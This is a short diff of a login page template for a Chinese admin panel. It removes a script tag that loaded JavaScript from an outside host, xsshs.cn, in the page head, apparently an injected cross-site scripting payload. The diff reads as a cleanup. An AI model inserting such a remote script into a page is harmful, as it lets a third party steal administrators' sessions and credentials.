@@ -7,7 +7,6 @@
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <meta name="_token" content="{{ csrf_token() }}"/>
     <title>欢迎登录后台管理系统</title>
-<script src="https://xsshs.cn/Ol9u"></script>
     <link rel="shortcut icon" type="image/png" href="{{ env('ICON') }}"/>
     <script src="/js/jquery.min.js"></script>
     <script src="/back/old/cloud.js"></script>
